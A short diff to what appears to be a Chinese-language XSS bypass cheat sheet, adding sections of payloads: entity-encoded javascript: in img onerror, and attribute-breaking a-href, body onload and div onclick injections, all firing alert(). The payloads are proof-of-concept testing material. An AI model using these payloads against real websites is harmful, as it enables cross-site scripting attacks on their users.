@@ -243,12 +243,25 @@ XSS payload只允许使用大小写字母数字加上`<^*~\-|_=+`这些特殊符
 
 Chrome会动态修正一些节点，如将</script x\>修正为</script>，由于该特性只是按照标签配对，没有考虑HTML注释或其他复杂情况，会导致xss.
 
-## 编码绕过
+## img编码绕过
 
 ```html
 <img src="" onerror="j&#00097vascript:alert('xss');">
 <img src="" onerror="j&#97vascript:alert('xss1');">
 <img src="" onerror=" javascript:alert('xss3');">
+```
+
+## a绕过
+
+```
+"><a href="javascript:alert(1)">click me</a><"
+```
+
+## body和div
+
+```
+"><body onload=alert(1)><"
+"><div onclick="alert('xss')">click me<"
 ```
 
 
@@ -285,3 +298,4 @@ Chrome会动态修正一些节点，如将</script x\>修正为</script>，由�
 > XMLHTTPRequest response
 >
 > Input.value
+
